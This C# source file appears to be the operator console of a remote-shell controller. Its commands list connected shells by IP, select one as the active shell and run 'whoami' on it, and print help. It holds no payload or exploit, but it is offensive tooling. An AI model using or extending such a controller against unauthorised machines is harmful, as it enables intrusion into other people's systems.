using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using Console = Colorful.Console;

namespace Controller
{
    /// <summary>
    /// Commands for the controller.
    /// </summary>
    public class Commands
    {
        [Command(Help = "Sets current active shell to be controlled.", Usage = "open [index] Ex. open 0")]
        public void Open(string index) 
        {
            try
            {
                int _index = 0;

                if (int.TryParse(index, out _index))
                {

                    Program.ActiveClient = Program.MainServer.Clients[_index];

                    Utils.Logging.Write(Utils.Logging.Type.Success, $"Active shell is now " + index);

                    Program.ActiveClient.WriteCMD("whoami");
                }
                else Utils.Logging.Write(Utils.Logging.Type.Error, $"{index} is not a valid number.");
            }
            catch (ArgumentOutOfRangeException ex)
            {
                Utils.Logging.Write(Utils.Logging.Type.Error, $"Shell of index {index} doesn't exist!");
            }
            catch { }
        }
        [Command(Help = "Shows all active shells.", Usage = "list")]
        public void List()
        {
            var clonedclients = Program.MainServer.Clients.ToList();

            if (clonedclients.Count > 0)
            {
                int maxiplength = clonedclients.OrderByDescending(x => x.EndPoint.Address.ToString()).FirstOrDefault().EndPoint.Address.ToString().Length;

                foreach (var p in clonedclients)
                {
                    string ipaddr = Utils.String.PadRight(p.EndPoint.Address.ToString(), maxiplength);

                    int index = clonedclients.IndexOf(p);

                    Console.WriteLine($"{index} | IP: {ipaddr}", Utils.Logging.GetTypeColor(Utils.Logging.Type.Normal));
                }
            }
            else
                Utils.Logging.Write(Utils.Logging.Type.Error, $"There are no active shells...");
            
        }

        [Command(Help = "Displays help.", Usage = "help")]
        public void Help()
        {
            Console.WriteLine(string.Empty);

            Type commandtype = this.GetType();

            var methods = commandtype.GetMethods().Where(m => m.GetCustomAttributes(typeof(Command), false).Length > 0 );

            int maxmethodnamelength = methods.OrderByDescending(x => x.Name.Length).FirstOrDefault().Name.Length;

            foreach (var method in methods) {

                string name = Utils.String.PadRight(method.Name, maxmethodnamelength);

                var commandattr = method.GetCustomAttribute<Command>();

                string helpstr = commandattr.Help;

                string usagestr = commandattr.Usage;

                string help = $"{name} - {helpstr}";

                Console.WriteLine(help);

                Console.WriteLine($"Usage: {usagestr}", Utils.Logging.GetTypeColor(Utils.Logging.Type.Error));
            }
        }
    }
}
